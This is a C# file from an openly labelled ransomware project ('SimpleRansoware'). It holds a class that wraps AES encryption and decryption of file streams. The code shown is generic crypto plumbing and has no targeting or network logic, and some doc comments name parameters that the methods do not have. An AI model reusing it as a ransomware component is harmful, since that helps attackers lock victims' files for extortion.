using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace SimpleRansoware
{
    /// <summary>
    /// Manager to Handle File Encription
    /// </summary>
    public sealed class CriptoFileManager
    {
        private CriptoFileManager() { }

        /// <summary>
        /// File Encryptor
        /// </summary>
        /// <param name="targetStream"></param>
        /// <param name="criptoEngine"></param>
        /// <param name="sourceData"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void Encrypt(Stream targetStream, ref byte[] sourceData)
        {
            // Create a Crypto Transform Object
            using (ICryptoTransform ct = CriptoKeyManager.CurrentAesEncriptedEngine.CreateEncryptor())
            {
                // Create a Crypto Stream
                using (CryptoStream cs = new CryptoStream(targetStream, ct, CryptoStreamMode.Write))
                {
                    cs.Write(sourceData, 0, sourceData.Length);
                }
            }
        }

        /// <summary>
        /// File Decryptor
        /// </summary>
        /// <param name="targetStream"></param>
        /// <param name="criptoEngine"></param>
        /// <param name="sourceData"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void Decrypt(Stream targetStream, ref Byte[] fileEncriptedData, int startPosition, byte[] key, byte[] iv)
        {
            // Create a Crypto Transform Object
            using (ICryptoTransform ct = CriptoKeyManager.CurrentAesEncriptedEngine.CreateDecryptor(key, iv))
            {
                // Create a Crypto Stream
                using (CryptoStream cs = new CryptoStream(targetStream, ct, CryptoStreamMode.Write))
                {
                    cs.Write(fileEncriptedData, startPosition, fileEncriptedData.Length - startPosition);
                    cs.Flush();
                }
            }
        }
    }
}
